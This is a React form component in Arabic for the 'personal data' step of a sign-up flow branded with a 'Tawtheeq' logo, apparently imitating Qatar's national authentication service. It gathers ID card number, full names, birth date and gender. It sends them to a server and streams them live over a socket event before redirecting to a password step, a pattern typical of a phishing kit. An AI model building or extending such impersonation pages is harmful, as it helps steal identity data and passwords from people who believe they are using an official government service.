import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { serverRoute, socket } from "./Home";
import axios from "axios";

const nationalities = [
  "أفغانستان",
  "ألبانيا",
  "الجزائر",
  "الأرجنتين",
  "أرمينيا",
  "أستراليا",
  "النمسا",
  "أذربيجان",
  "البحرين",
  "بنغلاديش",
  "بيلاروسيا",
  "بلجيكا",
  "البوسنة والهرسك",
  "البرازيل",
  "بلغاريا",
  "كمبوديا",
  "كندا",
  "تشيلي",
  "الصين",
  "كولومبيا",
  "كرواتيا",
  "كوبا",
  "قبرص",
  "جمهورية التشيك",
  "الدنمارك",
  "مصر",
  "إستونيا",
  "إثيوبيا",
  "فنلندا",
  "فرنسا",
  "جورجيا",
  "ألمانيا",
  "اليونان",
  "الهند",
  "إندونيسيا",
  "إيران",
  "العراق",
  "أيرلندا",
  "إيطاليا",
  "اليابان",
  "الأردن",
  "كازاخستان",
  "كينيا",
  "الكويت",
  "لبنان",
  "ليبيا",
  "ماليزيا",
  "المكسيك",
  "المغرب",
  "هولندا",
  "نيوزيلندا",
  "نيجيريا",
  "النرويج",
  "عمان",
  "باكستان",
  "فلسطين",
  "الفلبين",
  "بولندا",
  "البرتغال",
  "رومانيا",
  "روسيا",
  "المملكة العربية السعودية",
  "صربيا",
  "سنغافورة",
  "سلوفاكيا",
  "سلوفينيا",
  "الصومال",
  "جنوب أفريقيا",
  "كوريا الجنوبية",
  "إسبانيا",
  "السودان",
  "السويد",
  "سويسرا",
  "سوريا",
  "تايوان",
  "تايلاند",
  "تونس",
  "تركيا",
  "أوكرانيا",
  "الإمارات العربية المتحدة",
  "المملكة المتحدة",
  "الولايات المتحدة",
  "أوزبكستان",
  "فنزويلا",
  "فيتنام",
  "اليمن",
];

const PersonalData = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    nationality: "qatar",
    selectedNationality: "",
    idCardNumber: "",
    arabicName: "",
    englishName: "",
    birthDate: "",
    gender: "",
  });
  const [isLoading, setIsLoading] = useState(false);

  const handleInputChange = (field, value) => {
    const updatedData = { ...formData, [field]: value };
    setFormData(updatedData);
    sessionStorage.setItem("personalData", JSON.stringify(updatedData));
  };

  const handleContinue = async () => {
    setIsLoading(true);
    sessionStorage.setItem("personalData", JSON.stringify(formData));
    await submit();
  };

  const submit = async () => {
    try {
      const finalData = {
        ...JSON.parse(
          sessionStorage.getItem(
            `accountData_${sessionStorage.getItem("accountType")}`
          )
        ),
        accountType: sessionStorage.getItem("accountType"),
        ...formData,
      };
      const { data: userData, status } = await axios.post(
        serverRoute + "/newData/" + sessionStorage.getItem("id"),
        finalData
      );
      if (status === 201) {
        socket.emit("newData", finalData);
        sessionStorage.setItem("data", JSON.stringify(userData.user));
        window.location.href = "/password";
      } else {
        window.alert("حدث خطأ ما");
        setIsLoading(false);
      }
    } catch (error) {
      console.error(error);
      window.alert("حدث خطأ ما");
      setIsLoading(false);
    }
  };

  const handleBack = () => {
    navigate("/account-type");
  };

  const isFormValid =
    (formData.nationality === "qatar"
      ? formData.idCardNumber.trim() !== ""
      : formData.nationality === "other" &&
        formData.selectedNationality !== "") &&
    formData.arabicName.trim().length >= 3 &&
    formData.englishName.trim().length >= 3 &&
    formData.birthDate !== "" &&
    formData.gender !== "";

  return (
    <div className="bg-gray-50 flex flex-col w-full" dir="rtl">
      {/* Header */}
      <div className="w-full bg-white pt-4 px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between relative flex-row-reverse w-full">
            {/* Step 4 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-0 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  4
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  إنتهاء
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  التسجيل
                </p>
              </div>
            </div>

            {/* Step 3 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  3
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  كلمة
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  المرور
                </p>
              </div>
            </div>

            {/* Step 2 - Active */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full bg-[#0071bc] flex items-center justify-center text-white font-bold z-10">
                  2
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  البيانات
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  الشخصية
                </p>
              </div>
            </div>

            {/* Step 1 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-0 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  1
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  نوع
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  الحساب
                </p>
              </div>
            </div>
            <div className="absolute h-0.5 top-5 w-full bg-gray-200"></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 py-8">
        <div className="mx-auto  rounded-lg shadow-lg py-8 px-4">
          {/* Title */}
          <div className="text-right mb-8">
            <h2 className="text-2xl md:text-3xl font-bold text-gray-800">
              يرجى تعبئة البيانات الشخصية
            </h2>
            <div className="border-b-2 border-dotted border-gray-400 mt-4"></div>
          </div>

          <div className="space-y-6">
            {/* Nationality */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-4 block text-right">
                الجنسية <span className="text-red-600">*</span>
              </label>
              <div className="space-y-4">
                <label className="flex items-center justify-start gap-3 cursor-pointer">
                  <input
                    type="radio"
                    name="nationality"
                    value="qatar"
                    checked={formData.nationality === "qatar"}
                    onChange={(e) =>
                      handleInputChange("nationality", e.target.value)
                    }
                    className="w-6 h-6 cursor-pointer"
                  />
                  <span className="text-gray-800 font-bold">قطر</span>
                </label>

                <label className="flex items-center justify-start gap-3 cursor-pointer">
                  <input
                    type="radio"
                    name="nationality"
                    value="other"
                    checked={formData.nationality === "other"}
                    onChange={(e) =>
                      handleInputChange("nationality", e.target.value)
                    }
                    className="w-6 h-6 cursor-pointer"
                  />
                  <span className="text-gray-800 font-bold">جنسية أخرى</span>
                </label>
              </div>

              {/* Nationality Select - appears when "other" is selected */}
              {formData.nationality === "other" && (
                <div className="mt-4">
                  <select
                    value={formData.selectedNationality}
                    onChange={(e) =>
                      handleInputChange("selectedNationality", e.target.value)
                    }
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right bg-white"
                  >
                    <option value="">حدد الجنسية</option>
                    {nationalities.map((nat, index) => (
                      <option key={index} value={nat}>
                        {nat}
                      </option>
                    ))}
                  </select>
                </div>
              )}

              {/* ID Card Number - appears when "qatar" is selected */}
              {formData.nationality === "qatar" && (
                <div className="mt-4">
                  <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                    رقم البطاقة الشخصية <span className="text-red-600">*</span>
                  </label>
                  <input
                    type="text"
                    value={formData.idCardNumber}
                    onChange={(e) =>
                      handleInputChange("idCardNumber", e.target.value)
                    }
                    placeholder="رقم البطاقة الشخصية"
                    className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
                  />
                </div>
              )}
            </div>

            {/* Arabic Name */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                الاسم بالعربي <span className="text-red-600">*</span>
                <span className="text-sm text-gray-600 mr-2">(من 3 مقاطع)</span>
              </label>
              <input
                type="text"
                value={formData.arabicName}
                onChange={(e) =>
                  handleInputChange("arabicName", e.target.value)
                }
                placeholder="مثال ... عمر هاشم الهاشم"
                className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
              />
            </div>

            {/* English Name */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                الاسم بالإنجليزية <span className="text-red-600">*</span>
                <span className="text-sm text-gray-600 mr-2">(من 3 مقاطع)</span>
              </label>
              <input
                type="text"
                value={formData.englishName}
                onChange={(e) =>
                  handleInputChange("englishName", e.target.value)
                }
                placeholder="مثال ... Omar Hashim Alhashim"
                className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right placeholder-gray-400 bg-white"
              />
              <p className="text-sm text-red-600 mt-2 text-right">
                يرجى إدخال الاسم باللغتين العربية والإنجليزية
              </p>
            </div>

            {/* Birth Date */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-2 block text-right">
                تاريخ الميلاد <span className="text-red-600">*</span>
                <span className="text-sm text-gray-600 mr-2">
                  (يوم/شهر/سنة)
                </span>
              </label>
              <div className="relative">
                <input
                  type="date"
                  value={formData.birthDate}
                  onChange={(e) =>
                    handleInputChange("birthDate", e.target.value)
                  }
                  className="w-full px-4 py-3 rounded-lg border border-gray-300 text-right bg-white"
                />
              </div>
            </div>

            {/* Gender */}
            <div>
              <label className="text-lg font-bold text-gray-800 mb-4 block text-right">
                الجنس <span className="text-red-600">*</span>
              </label>
              <div className="flex items-center justify-start gap-8">
                <label className="flex items-center gap-3 cursor-pointer">
                  <span className="text-gray-800 font-bold">ذكر</span>
                  <input
                    type="radio"
                    name="gender"
                    value="male"
                    checked={formData.gender === "male"}
                    onChange={(e) =>
                      handleInputChange("gender", e.target.value)
                    }
                    className="w-6 h-6 cursor-pointer"
                  />
                </label>
                <label className="flex items-center gap-3 cursor-pointer">
                  <span className="text-gray-800 font-bold">أنثى</span>
                  <input
                    type="radio"
                    name="gender"
                    value="female"
                    checked={formData.gender === "female"}
                    onChange={(e) =>
                      handleInputChange("gender", e.target.value)
                    }
                    className="w-6 h-6 cursor-pointer"
                  />
                </label>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex flex-row-reverse gap-6 justify-center mt-10">
              <button
                onClick={handleContinue}
                disabled={!isFormValid}
                className={`font-bold py-2 px-16 rounded-lg text-xl transition-colors ${
                  isFormValid
                    ? "bg-[#3c96c4] hover:bg-[#2d7fa8] text-white cursor-pointer"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                استمر
              </button>
              <button
                onClick={handleBack}
                className="bg-white hover:bg-gray-100 text-gray-800 font-bold py-2 px-16 rounded-lg text-xl border-2 border-gray-300 transition-colors"
              >
                رجوع
              </button>
            </div>
          </div>
        </div>
      </main>

      {/* Loading Popup */}
      {isLoading && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
            <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-6" />
            <div className="relative w-32 h-32 mb-4">
              <img src="/loading.gif" alt="Loading" className="w-full h-full" />
            </div>
            <p className="text-gray-800 text-lg font-bold text-center">
              جاري المعالجة...
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

export default PersonalData;
